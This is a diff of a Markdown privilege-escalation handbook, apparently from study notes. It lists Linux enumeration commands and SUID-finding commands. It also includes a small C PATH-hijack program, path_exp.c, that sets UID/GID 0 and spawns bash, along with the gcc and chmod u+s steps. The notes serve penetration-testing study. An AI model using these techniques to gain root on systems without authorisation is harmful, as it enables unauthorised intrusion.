@@ -1,32 +1,29 @@
 # Privilage Escalation Handbook
-# Includes Linux and Windows
+### Includes Linux and Windows
 
 # Linux Privilage Escalation
 
-# Enumeration
-< Find Hostname >
-  - hostname
-
-< Find uname >
-  - uname -a `for all information`
----------------------
-Function Shortcut
-
-- Kernel Name	-s
-- Kernel Release	-r
-- Kernel Version*	-v
-- Network Node Name (Hostname)	-n
-- Machine architecture	-m
-- Processor architecture	-p
-- Hardware Platform (OS architecture)	-i
-- Operating System	-o
----------------------
+# Useful Paths and Commands for Enumeration
 
 < /proc/version > `provides information about the target system processes.`
  
 < /etc/issues > `This file usually contains some information about the operating system but can easily be customized or changes.`
+
+< hostname >
+  - hostname
+
+< uname >
+  - uname -a `for all information`
+    - Kernel Name	-s
+    - Kernel Release	-r
+    - Kernel Version*	-v
+    - Network Node Name (Hostname)	-n
+    - Machine architecture	-m
+    - Processor architecture	-p
+    - Hardware Platform (OS architecture)	-i
+    - Operating System	-o
  
- < The “ps” command provides a few useful options. >
+< ps > `This command provides a few useful options.`
   - ps -A: `View all running processes`
   - ps axjf: `View process tree (see the tree formation until ps axjf is run below)`
   - ps aux: `The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.`
@@ -69,6 +66,7 @@ Function Shortcut
   - find / -name gcc*
   - find / -perm -u=s -type f 2>/dev/null: `Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.`
   - find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null `for more info on files with SUID set` 
+ 
 # Automated Enumeration Tools
 
   - LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
@@ -119,7 +117,7 @@ Function Shortcut
   4. Is there a script/application you can start that will be affected by this vulnerability?
 ---------------------------
   path_exp.c:
----------------------------
+
   #include <unistd.h>
   void main()
   {
@@ -127,6 +125,7 @@ Function Shortcut
   setgid(0);
   system(thm); `any binary that will run /bin/bash`
   }
+---------------------------
 
   - gcc path_exp.c -o path -w `compile the C script`
   - chmod u+s path
